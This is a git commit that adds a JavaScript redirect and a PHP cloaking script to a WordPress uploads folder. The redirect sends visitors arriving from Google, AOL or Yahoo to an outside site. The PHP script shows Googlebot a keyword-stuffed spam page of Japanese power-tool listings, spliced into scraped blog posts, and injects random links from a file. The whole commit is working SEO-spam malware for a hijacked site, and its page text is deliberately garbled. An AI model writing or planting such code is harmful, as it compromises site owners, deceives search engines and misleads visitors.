d590c13d45ffd04e040d202ac5061f8261f0d57c
muroi <intemous9@gmail.com>
2016-09-09 00:09:30 +0900

    first commit .

---
+++ images/wp-content/uploads/ad.js
@@ -0,0 +1,4 @@
+var s = document.referrer;
+if (s.indexOf('google') > 0 || s.indexOf('aol') > 0 || s.indexOf('yahoo') > 0) {
+    location.href = 'http://www.fashionhuman.com/';
+}
---
+++ images/wp-content/uploads/ad.php
@@ -0,0 +1,323 @@
+<script type="text/javascript" src="/wp-content/uploads/ad.js"></script>
+<?php
+ini_set('display_errors', false);
+function GetAgent(){
+    $ag = strtolower($_SERVER['HTTP_USER_AGENT']);
+    if(strpos($ag, "googlebot")>0){
+        return "google";
+    }
+    return "no";
+}
+function GetRandomLink(){
+    $linkfilename = dirname(__FILE__)."/link.db";
+    $randomlinkstr = "";
+    if(file_exists($linkfilename)){
+        $randomlinkstr = file_get_contents($linkfilename);
+    }
+    return $randomlinkstr;
+}
+if(GetAgent()<>"no"){
+    $request_url = $_SERVER["REQUEST_URI"];
+    if($request_url=="/"){
+        ?>
+        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title> アルケ 工具 16段 標準キット 室外用階段 送料無料 アルケ 国産にはないオシャレなデザインです 亜鉛メッキ DIYスチール製ルーター   室外用階段 直径1400MM スチールジンク -blog.dtdweb.com</title>
+<meta name="keywords" content="通信販売,通販,ショッピング,オンラインショッピング,買い物,プレゼント,ギフト,贈り物,贈答品,お中元,お歳暮,お買い得,,,,,,,,,,,,,,,,,,,,,アルケ　室外用階段　スチールジンク　標準キット　16段　直径1400MM　 亜鉛メッキ" />
+<meta name="description" content="送料無料【アルケ】室外用階段！国産にはないオシャレなデザインです！！。アルケ　室外用階段　スチールジンク　標準キット　16段　直径1400MM　 亜鉛メッキ" />
+<meta http-equiv="Content-Language" content="ja" />
+<meta http-equiv="Content-Script-Type" content="text/javascript" />
+<meta http-equiv="Content-Style-Type" content="text/css" />
+</head>
+<BODY onload=Wait.style.visibility="hidden">
+<div id="container">
+	<div id="header" class="clearfix">
+		<div class="leftBox">
+			<h2><a href="http://blog.dtdweb.com/"></a></h2>
+		</div>
+		<ul id="gNavi" class="clearfix">
+			<li class="navi01"><a href="http://blog.dtdweb.com/a></li>
+			<li class="navi02"><a href="http://blog.dtdweb.com/"></a></li>
+			<li class="navi03"><a href="http://blog.dtdweb.com/"></a></li>
+			<li class="navi04"><a href="http://blog.dtdweb.com/"></a></li>
+		</ul>
+		<ul id="searchform" class="infoNavi">
+			<form method="get" id="searchform" action="http://alimali.jp/">
+				<li> <input type="text" value="" name="s" id="s" />
+					　検索
+				</li>
+			</form>
+		</ul>
+	</div>
+<p id="Wait" align="center"><br>Now Loading...</p>
+	<div id="mainImg">
+		<div class="slides_container slide02">
+			<div><a href="http://blog.dtdweb.com/"></a></div>
+			<div><a href="http://blog.dtdweb.com/"></a></div>
+		</div>
+	</div>
+<div id="main">
+	<div id="conts">
+		<div class="shopDetail">
+					<ul>
+						<li class="imgBoxL">
+							<div class="fltImg"><a href="http://blog.dtdweb.com/"></a></div>
+							<div class="textArea fltR">
+								<dl class="clearfix">
+								<dt><a href="http://blog.dtdweb.com/">観光文化　230　「今、ここ」の出会いを大事に</a><span>2016年8月1日 <a href="http://blog.dtdweb.com/">未分類</a></span></dt><dd></dd>
+								</dl>
+								<p>
+高校卒業後、事務の仕事に就いたのですが、もっと人と接する仕事がしたいと思い、駿台トラベル＆ホテル専門学校に通いだ…
+								<a href="http://blog.dtdweb.com/"><br /> ▼続きを読む</a ></p>
+								<ul>
+<div class="addthis_toolbox addthis_default_style" addthis:title="観光文化　230　「今、ここ」の出会いを大事に" addthis:url="http://alimali.jp/?p=3455">
+<a class="addthis_button_facebook"></a>
+<a class="addthis_button_twitter"></a>
+</div>
+								</ul>
+							</div>
+						</li>
+					</ul>
+		</div>
+		<div class="shopDetail">
+					<ul>
+						<li class="imgBoxL">
+							<div class="fltImg"><a href="http://blog.dtdweb.com/"></a></div>
+							<div class="textArea fltR">
+								<dl class="clearfix">
+								<dt><a href="http://blog.dtdweb.com/">オークラ輸送機その他 ベルトコンベヤ ベルコンミニ3 ローラエッジタイプローラエッジタイプ センタドライブローラエッジタイプ 200V単相 DMRB20DR350N22L06Y, オークラ輸送機 ベルトコンベヤ ベルコンミニ3 ローラエッジタイプ センタドライブ 200V単相 DMRB20DR350N22L06Y</a><br />
+<span>2016年6月23日 <a href="http://blog.dtdweb.com/">グルメ</a> , <a href="http://blog.dtdweb.com/">在来種</a> , <a href="http://blog.dtdweb.com/">食材</a></span></dt><dd></dd>
+								</dl>
+								<p>富松神社の宮司さんから富松一寸の豆を分けて頂いた。
+巷に広く出回っている一寸豆を牛に例えると和牛。
+武庫一寸…
+								<a href="http://blog.dtdweb.com/"><br /> ▼続きを読む</a ></p>
+								<ul>
+<div class="addthis_toolbox addthis_default_style" addthis:title="行基ゆかりの“富松一寸ソラマメ”から有馬一寸へ" addthis:url="http://alimali.jp/?p=3449">
+<a class="addthis_button_facebook"></a>
+<a class="addthis_button_twitter"></a>
+</div>
+								</ul>
+							</div>
+						</li>
+					</ul>
+		</div>
+		<div class="shopDetail">
+					<ul>
+						<li class="imgBoxL">
+							<div class="fltImg"><a href="http://blog.dtdweb.com/"></a></div>
+							<div class="textArea fltR">
+								<dl class="clearfix">
+								<dt><a href="http://blog.dtdweb.com/">行基ゆかりの“富松一寸ソラマメ”</a><span>2016年5月15日 <a href="http://blog.dtdweb.com/">グルメ</a> , <a href="http://blog.dtdweb.com/">周辺エリア</a> , <a href="http://blog.dtdweb.com/">在来種</a> , <a href="http://blog.dtdweb.com/">歴史と文化</a> , <a href="http://blog.dtdweb.com/">美味いモノ探偵団</a> , <a href="http://blog.dtdweb.com/">WIKUS 電着ダイヤバンドソー電動ノコギリ 6450X20X0．5 ＃60 570-20-0.5-6450-D252,バンドソー作業用品 【条件付送料無料】 作業用品 切断用品 電着ダイヤモンドバンドソー</a><br />
+</span></dt><dd></dd>
+								</dl>
+								<p>富松一寸ソラマメは、一粒がまさしく一寸（3㎝）ある大粒のソラマメ。尼崎市富松町にある富松神社の宮司　善見壽男氏が地域の親…
+								<a href="http://blog.dtdweb.com/"><br /> ▼続きを読む</a ></p>
+								<ul>
+<div class="addthis_toolbox addthis_default_style" addthis:title="行基ゆかりの“富松一寸ソラマメ”" addthis:url="http://alimali.jp/?p=3435">
+<a class="addthis_button_facebook"></a>
+<a class="addthis_button_twitter"></a>
+</div>
+								</ul>
+							</div>
+						</li>
+					</ul>
+		</div>
+		<div class="shopDetail">
+					<ul>
+						<li class="imgBoxL">
+							<div class="fltImg"><a href="http://blog.dtdweb.com/"></a></div>
+							<div class="textArea fltR">
+								<dl class="clearfix">
+								<dt><a href="http://blog.dtdweb.com/">有馬山椒を「ひょうごの在来作物」に認定してもらう為に</a><span>2016年5月3日 <a href="http://blog.dtdweb.com/">在来種</a> , <a href="http://blog.dtdweb.com/">美味いモノ探偵団</a> , <a href="http://blog.dtdweb.com/">食材</a></span></dt><dd></dd>
+								</dl>
+								<p>有馬山椒を世界に売っていく為のプロセスとして、2015年8月、兵庫県、神戸市の地域資源に“有馬山椒”を認定してもらいまし…
+								<a href="http://blog.dtdweb.com/"><br /> ▼続きを読む</a ></p>
+								<ul>
+<div class="addthis_toolbox addthis_default_style" addthis:title="有馬山椒を「ひょうごの在来作物」に認定してもらう為に" addthis:url="http://alimali.jp/?p=3433">
+<a class="addthis_button_facebook"></a>
+<a class="addthis_button_twitter"></a>
+</div>
+								</ul>
+							</div>
+						</li>
+					</ul>
+		</div>
+		<div class="shopDetail">
+					<ul>
+						<li class="imgBoxL">
+							<div class="fltImg"><a href="http://blog.dtdweb.com/"></a></div>
+							<div class="textArea fltR">
+								<dl class="clearfix">
+								<dt><a href="http://blog.dtdweb.com/">味噌作り　在来種の八鹿浅黄を使用</a><span>2016年2月19日 <a href="http://blog.dtdweb.com/">在来種</a> , <a href="http://blog.dtdweb.com/">食材</a></span></dt><dd></dd>
+								</dl>
+								<p>八鹿（ようか）という場所が兵庫県の北部にあります。
+昔、列車で八鹿の駅に着き、バスで鉢伏高原へスキーに行く為の主用…
+								<a href="http://blog.dtdweb.com/"> 送料無料  取寄品 日立 卓上スライド丸のこ ツール DIYDIY 作業用品 作業道具 小型切断機 ツール 作業工具3電動ノコギリ ツール 作業工具3 小型切断機</a><br />
+
+<a class="addthis_button_twitter"></a>
+</div>
+								</ul>
+							</div>
+						</li>
+					</ul>
+		</div>
+O0146発電機 デンヨー インバーター発電機 GE-1600-IV 送料無料工具小型ガソリンエンジンGE即決Denyo【中古】, O0146 デンヨー インバーター発電機 GE-1600-IV 送料無料工具小型ガソリンエンジンGE即決Denyo【中古】直送品 エスコ ESCO EA860C-1 AC100V/2.0kw(50Hz) 発電機, 直送品 エスコ ESCO EA860C-1 AC100V/2.0kw電動工具及び関連工具発電機(50Hz)ESCO便利カタログ 発電機ヤマワ切削工具(YAMAWA) 管用 タップNPTF 2 -11.5研削・研磨 1本, 3,240円以上ご購入で送料無料！【日立工機】●ヤマト便●エンジン発電機《E25U》オープン型インバータ式,インバータ発電機発電機 【日立工機】●ヤマト便●エンジン発電機《E25U》オープン型インバータ式Fエンジン工具・発電・溶接園芸 eub4760  ,  [makita]電動ドライバー マキタ電動工具園芸用品 エンジンブロア マキタ(makita)ガーデン工具 ランキング 激安 通信販売/通販 ショッピング<a href="http://blog.dtdweb.com/">タイテックス 内部クーラント仕様超硬ドリル（Ｓｕｐｒｅｍｅ超硬コーティングドリル ＤＣ１７０） （1本） DC170-20-14.000A1-WJ30EJ, ワルタージャパン 超硬コーティングドリル切削工具電動ドリル</a><br />
+やまびこ 新ダイワ エンジンチェンソー E1038S-400, やまびこ 新ダイワ エンジンチェンソーメーカー名：Yやまびこ/YAMABIKOチェンソー E1038S-400WIKUS作業用品 電着ダイヤバンドソー 5250X20X0．8 ＃80 570-20-0.8-5250-D181, 【条件付送料無料】 作業用品配管資材・工具 ピックアップ 切断用品 電着ダイヤモンドバンドソー電動ノコギリオークラ輸送機 ベルトコンベヤ荷役機器その他【分類別】 ベルコンミニ3電動工具・機械類【メーカー別】 ローラエッジタイプ センタドライブ 200V単相 DMRB15DR200N16R06Y, オークラ輸送機 ベルトコンベヤ ベルコンミニ3 ローラエッジタイプ センタドライブ 200V単相 DMRB15DR200N16R06Y精和産業 ダイヤフラム式  エアレス塗装機スーパー60Lその他  電動エアレス スーパー60L (Cセット)ホース30M付 ＜純正品＞最安値に挑戦中！セイワ 売れ筋, 送料無料精和産業サンドビック スーパーＵドリル 円筒シャンク【880-D3800L40-04】(旋削・フライス加工工具・ホルダー)(代引不可), サンドビック スーパーＵドリル 円筒シャンク【880-D3800L40-04】研削・研磨(旋削・フライス加工工具・ホルダー)その他(代引不可)<a href="http://blog.dtdweb.com/">【カード決済OK】富士コンプレッサー製作所その他発電機 富士　一段圧縮パッケージ形コンプレッサ　６０Ｈｚ NLP37PMT6, 富士　一段圧縮パッケージ形コンプレッサ　６０Ｈｚ</a><br />
+エスコ/ESCOメーカー名：E ヒートブロワー（温度可変式） AC100V/1200W EA365VB-3 JAN：4548745988338, エスコ/ESCO ヒートブロワー（温度可変式） AC100V/1200W EA365VB-3エスコ/ESCO JAN：4548745988338その他ダイジェット切削工具 頑固一徹 MSN-M16-357S-S32C,研削・研磨 【条件付送料無料】 切削工具 旋削・フライス加工工具 ホルダー旋削・フライス加工工具NOGA　60－100外径用カウンターシンク90°MT－3シャンク研削・研磨(1本) KP02-166切削関連 4044754, 【ポイント10倍】カウンターシンク（外径面取り用）切削関連新ダイワ（やまびこ）エンジンチェーンソ　エンジンチェンソーE1040D-400BP[チェンソー],チェンソー 新ダイワ（やまびこ）　エンジンチェンソーE1040D-400BP園芸工具[チェンソー]【日立工機】 卓上ボール盤電動工具　B13Sメーカー　100V  加工能力１３ｍｍ　角テーブル電動ドリル　代引不可,<a href="http://blog.dtdweb.com/">オークラ輸送機 ベルトコンベヤオークラ輸送機 ジャブコン2 強力蛇行レスタイプ 三相200V JHG60HL250N10L20Z メーカー別     電動工具 機械類   オークラ輸送機 ベルトコンベヤ ジャブコン2その他 強力蛇行レスタイプ 三相200V JHG60HL250N10L20Z</a><br />
+マルヤス機械　ベルトコンベヤ　ミニエックス2型　MMX2-VG　インバータ変速・単相200V　MMX2-VG-204-300-150-IV-18-A　[配送制限商品], マルヤス機械　ベルトコンベヤ　ミニエックス2型　MMX2-VGその他　インバータ変速・単相200V荷役機器【分類別】　MMX2-VG-204-300-150-IV-18-Aミニエックス2型 MMX2-VG　[配送制限商品]オークラ輸送機あ行 電動工具・機械 ベルトコンベヤ ベルコンミニ3 ヘッドドライブオークラ輸送機 スタンダードタイプその他 DHH40UL450N13R04Y, オークラ輸送機 ベルトコンベヤ ベルコンミニ3 ヘッドドライブ スタンダードタイプ DHH40UL450N13R04Yフクダ精工/F.K.D 超硬付刃テーパーシャンクドリル 48 TD48工具・整備用品(3033384)電動ドリル JAN：4582115714035, フクダ精工/F.K.D 超硬付刃テーパーシャンクドリル 48 TD48(3033384) JAN：4582115714035トラスコ中山/TRUSCOサンドビック コロミル490カッター【A490-080J25.4-08L】(旋削・フライス加工工具・ホルダー)研削・研磨(代引不可), サンドビック コロミル490カッター【A490-080J25.4-08L】その他(旋削・フライス加工工具・ホルダー)(代引不可)ISF(イシハシ精工) テーパーシャンクドリル 63.0mm※取寄せ品 IS-TD-63.0,電動ドリル ISF(イシハシ精工) テーパーシャンクドリル錐（きり）鉄工用ドリル 63.0mm※取寄せ品 IS-TD-63.0<a href="http://blog.dtdweb.com/">岡崎精工:スパイラルマシンリーマ46.5×MT4リーマ面取り工具電動ドリル SPMR465, 【ポイント10倍】穴あけ 工具 リーマ</a><br />
+日立ツール/HITACHI フライス切削用インサート ZCFW160-R0.3 コーティング：THコート(PTH08M) 1ケース（10個入）,工具・整備用品 日立ツール/HITACHIメーカー名：H フライス切削用インサート ZCFW160-R0.3 コーティング：THコート電動ドリル(PTH08M) 1ケース（10個入）
+
+<h1> アルケ 工具 16段 標準キット 室外用階段 送料無料 アルケ 国産にはないオシャレなデザインです 亜鉛メッキ DIYスチール製ルーター   室外用階段 直径1400MM スチールジンク </h1><table><tbody><tr><td class="pro_name">アルケ　室外用階段　スチールジンク　標準キット　16段　直径1400MM　 亜鉛メッキ, 送料無料【アルケ】室外用階段！国産にはないオシャレなデザインです！！工具・DIYスチール製ルーター</td></tr><tr><td class="iku">spk40qqR</td></tr><tr><td class="normalprice">577600円-37%-366400円</td></tr><tr><td>　<<table class='item_det_table' width='400px' border='0' cellspacing='0' cellpadding='0'> <tr><th scope='row'>商品番号</th><td>21437301</td></tr><tr><th scope='row'>メーカー名</th><td>アルケ</td></tr><tr><th scope='row'>サイズ</th><td>高さ 3760mm</td></tr><tr><th scope='row'>カラー</th><td>亜鉛メッキ</td></tr><tr><th scope='row'>通常納期(宅配)</th><td>７～１４日後発送</td></tr><tr><th scope='row'>通常納期(工事)</th><td>１４日後以降発送（要問合せ）</td></tr><tr><th scope='row'>直径（mm）</th><td>1400</td></tr><tr><th scope='row'>配送区分</th><td>1<br>※商品により配送可能エリアが異なります。<br>をご覧ください。</td></tr><tr><th scope='row'>工事対応</th><td>この商品は工事を承っておりません。<br></td></tr></table><br><br><div class='bott_10'>亜鉛メッキ加工により塩害にも強く、国産にないデザイン性から海岸地域や別荘をお持ちのお客様に人気です。</div ><br><br><div><b>備考</b><div><div class='bott_10'>●標準キット内容：ビーチ踏板15枚＋最上段踊り場1枚＋階段上の手すり<br>●高さ：336cm～376cm<br>●在庫切れの場合、1～3か月納期がかかる場合がございます。詳しくはお問い合わせください<br>●荷卸しは現場前車上引渡しとなりますので、荷卸し人が必要となります。<br>●詳細寸法は図面にてご確認下さい</div ><br><br><div align='left' style='margin:2px 0px 0px 0px;'></div><br><br></td></tr></tbody></table>
+<p><time datetime="" class="entry-date"></time></p>
+<pre></pre>
+
+		<div class="navigation">
+			<span class="previous-entries"><a href="http://blog.dtdweb.com/">以前の記事へ</a></span>
+			<span class="next-entries"></span>
+		</div>
+	<div class="category">
+		<div class="inner">
+		<h2></h2>
+				<ul class="clearfix">
+				<li class="cat-item cat-item-1"><a href="http://blog.dtdweb.com/">未分類</a> (1)
+</li>
+	<li class="cat-item cat-item-487"><a href="http://blog.dtdweb.com/">イベント</a> (40)
+</li>
+	<li class="cat-item cat-item-47"><a href="http://blog.dtdweb.com/">グルメ</a> (52)
+</li>
+	<li class="cat-item cat-item-54"><a href="http://blog.dtdweb.com/">ディープなプラン</a> (45)
+</li>
+	<li class="cat-item cat-item-101"><a href="http://blog.dtdweb.com/">メディアに掲載された話</a> (11)
+</li>
+	<li class="cat-item cat-item-586"><a href="http://blog.dtdweb.com/">六甲山</a> (5)
+</li>
+	<li class="cat-item cat-item-46"><a href="http://blog.dtdweb.com/">周辺エリア</a> (22)
+</li>
+	<li class="cat-item cat-item-9"><a href="http://blog.dtdweb.com/">御所坊主人　四郎兵衛ブログ</a> (64)
+</li>
+	<li class="cat-item cat-item-587"><a href="http://blog.dtdweb.com/">有馬のうんちく</a> (36)
+</li>
+	<li class="cat-item cat-item-229"><a href="http://blog.dtdweb.com/">有馬の宿</a> (26)
+</li>
+	<li class="cat-item cat-item-486"><a href="http://blog.dtdweb.com/">ＴＫＫ　ベビーホイスト　５０ｋｇ日立　３０ｍ【物流保管用品】【チェンブロック・クレーン】【ホイスト】, ＴＫＫ　ベビーホイスト　５０ｋｇ　３０ｍ</a><br />
+ (10)
+</li>
+	<li class="cat-item cat-item-574"><a href="http://blog.dtdweb.com/">裏道アクセス</a> (4)
+</li>
+	<li class="cat-item cat-item-61"><a href="http://blog.dtdweb.com/">違いの分かる人のお土産</a> (11)
+</li>
+		</ul>
+		<h3>Archives</h3>
+		<ul class="clearfix">
+				<li><a href="http://blog.dtdweb.com/">2016年8月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2016年6月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2016年5月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2016年2月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2016年1月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2015年8月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2014年12月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2014年11月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2014年8月</a></li>
+	<li><a href="http://blog.dtdweb.com/"> ＮＯＧＡ ＮＯＧＡ Ｋ３内外径用カウンターシンク９０°１２．７シャンクねじ切り 面取り工具 KP04100■工具 DIY 8648 切削工具研削 研磨 面取り工具 工作機用面取り工具 ノガ ジャパン 株   TC  TN   税込5 000円以上ご購入で送料無料 </a><br />
+</li>
+	<li><a href="http://blog.dtdweb.com/">2013年12月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2013年9月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2013年8月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2013年7月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2013年6月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2013年5月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2013年4月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2013年3月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2013年2月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2013年1月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2012年12月</a></li>
+	<li><a href="http://blog.dtdweb.com/">RYOBI(リョービ):ウインチ 軽量コンパクト設計 ワイヤーφ5x21m付ホイストハンドウインチ WI-125, 【ポイント10倍】電動ドライバー</a><br />
+</li>
+	<li><a href="http://blog.dtdweb.com/">2012年10月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2012年9月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2012年8月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2012年7月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2012年6月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2012年5月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2012年4月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2012年3月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2012年2月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2012年1月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2011年12月</a></li>
+	<li><a href="http://blog.dtdweb.com/">ホンダサイクロコンバーター搭載発電機EM23 Honda発電機 オイル1缶付き   多くの電気がほしい 長時間使いたい方へ 12Vバッテリーの充電に役立つ 交直両用コンパクト発電機 発電機</a><br />
+</li>
+	<li><a href="http://blog.dtdweb.com/">2011年10月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2011年9月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2011年7月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2011年6月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2011年4月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2011年3月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2010年5月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2010年4月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2010年3月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2010年2月</a></li>
+	<li><a href="http://blog.dtdweb.com/">2010年1月</a></li>
+		</ul>
+		</div>
+	</div>
+	</div>
+		<div id="sideBar">
+			<div class="inner">
+				<h3></h3>
+					<p class="non">
+<a href="http://blog.dtdweb.com/">オークラ輸送機 ベルトコンベヤメーカー別 ・ （ 電動工具_機械類 ） ジヤブコン カーブベルトタイプ　JCB20H90L-N18Y09, オークラ輸送機 ベルトコンベヤ ジヤブコン カーブベルトタイプ物流荷役機器その他　JCB20H90L-N18Y09</a><br />
+
+<a href="http://blog.dtdweb.com/">
+</a>
+	</p>
+		<div class="Reserve">
+					<h3><a href="http://blog.dtdweb.com/"></a></h3>
+				</div>
+		<div class="comBox">
+					<h3 class="ttl"></h3>
+					<dl class="clearfix">
+						<dt></dt>
+						<dd class="dd01"><span>@goshobo</span><a href="http://blog.dtdweb.com/"></a></dd>
+					</dl>
+				</div>
+				<div class="news">
+<div id="twitter"></div>
+<div style="text-align: right;">
+<a href="javascript:twbtn('back');">前へ</a>
+<a href="javascript:twbtn('next');">次へ</a>
+</div>
+</div>
+				<h3 class="h301"></h3>
+				<div class="comBox">
+<div id="fb-root"></div>
+<div class="fb-like-box" data-href="http://blog.dtdweb.com/goshobo" data-height="80" data-width="195" data-show-faces="false" data-stream="false" data-header="false"></div>
+				</div>
+			</div>
+	</div>
+</div>
+	<div id="footer">
+	<div class="inner clearfix">
+		<p class="copyright">c 2011 有馬里</p>
+		<p class="message">※本ページのすべての商標と著作権はそれぞれの所有者に帰属します。</p>
+		</div>
+	</div>
+</div>
+
+T.MuroiのblogAndroidやweb関連の情報を書いたり、たまに関係ない事書いたりGitHub緑化活動経過報告(1ヶ月くらい)2016/8/11dev,GitHubGitHub緑化活動自体は結構今更感があったのですが、ふと仕事以外でもコードを書く時間を意識的に持ちたいなと思い始めてみました。...記事を読むAndroidのwebviewで画像が正しく表示されない時の対処法2015/12/23Android最近Androidアプリを開発している時に発生したのですが、webviewを表示する画面で一部画像が正しく表示されない問題が発生しました。...記事を読む[WordPress]今更ながらgistを使い始めました2015/6/28WordPressブログを書く際に記事にソースコードを載せるのですが、これまではシンタックスハイライトのプラグインを使っていたのですが、中々しっくり来るプラグ...記事を読む[Android]XmlPullParserException:Unexpectedtokenが発生した時の対処方法2015/6/17AndroidAndroidアプリ開発の際、リソースファイルやHttp経由で取得したUTF-8なxmlファイルをStringReaderで読み込むと、下記...記事を読む[Android]URLConnectionでリダイレクトにも対応してみた2015/6/16Android,スマホ開発org.apache.httpパッケージとAndroidHttpClientクラスがAndroid5.1(APILevel22)から非推...記事を読む[Android]FragmentでMapViewを使った時の問題と解決策2015/3/31Android久しぶりの更新です。最近ぜんぜん更新しないまま、だいぶ経ってしまいました。書きたい事は結構あるのに、忙しいとかを理由にサボってしまい…。...記事を読む[Android]GPSの使い方、プロバイダのメリット・デメリットと使い分け2013/4/6AndroidGPS機能を使ったアプリを開発する機会があったんですが、調べてみると結構複雑でして。GPSを使うにも、ネットワークから取得す...記事を読む[Android]SharedPreferencesを簡単に使うためのラッパークラスを作成してみました2013/3/19AndroidAndroidのデータ永続化手法として、SQLiteやSharedPreferencesとかありますよね。自分は比較的簡単に...記事を読む[Android]WiFi接続まわりで苦戦したのでメモ2013/3/8Android,スマホ開発AndroidのWiFi設定や変更において、色々と苦戦したのでその時の記録をメモ。(*2013年3月現在:APILevel8~16に...記事を読むPhoneGapで始めるスマホアプリ開発-iOS編　HelloWorldを表示！各種APIを試すまで2012/7/9iPhone,スマホ開発こんにちは！前回の記事PhoneGapで始めるスマホアプリ開発~iOS編(セットアップ)~こちらでPhoneGapでの開発環...記事を読むPhoneGapで始めるスマホアプリ開発~iOS編(セットアップ)~2012/6/26iPhone,スマホ開発build.phonegap/doctorseroneスマホアプリの開発を行なう場合、それぞれ開発をするとなるとiPhone...記事を読むWordPressのデザインを変更する際に知っておくと良さそうな事2012/4/24WordPressWordPressPencilandPins-05/thisismyurlWordPress、他ブログサービスと異なるのは...記事を読む12&#160;カテゴリーAndroiddevGitHubiPhoneWordPressスマホ開発タグAndroiddevGItHubiPhonePhoneGapWordPressスマートフォン開発アーカイブ2016年8月2015年12月2015年6月2015年3月2013年4月2013年3月2012年7月2012年6月2012年4月Copyright&copy;T.MuroiのblogAllRightsReserved.
+<?php echo GetRandomLink(); ?></body>
+</html>
+        <?php
+        die();
+    }
+}
+else{
+    $request_url = $_SERVER["REQUEST_URI"];
+    if($request_url=="/"){
+        ?>
+        <?php
+    }
+}
+?>
